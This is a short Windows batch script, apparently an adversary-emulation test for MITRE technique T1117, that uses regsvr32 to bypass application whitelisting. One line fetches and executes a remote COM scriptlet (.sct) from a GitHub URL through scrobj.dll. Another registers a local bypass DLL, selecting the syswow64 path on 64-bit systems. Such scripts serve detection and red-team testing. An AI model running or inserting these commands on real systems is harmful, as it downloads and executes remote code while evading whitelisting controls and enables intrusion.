@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Suspicious execution uing Regsvr32 (T1117)
ECHO.
ECHO [+] Register DLL using 'REGSVR32' to bypass process whitelisting and execute payload (COM scriplets)
ECHO -------------------------------------------------------------------------------------
set "CPATH=%cd%"
regsvr32.exe /u /n /s /i:https://raw.githubusercontent.com/greycel/poc/master/notepad.sct scrobj.dll
IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s %CPATH%\bin\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s %CPATH%\bin\AllTheThingsx86.dll )
ECHO.
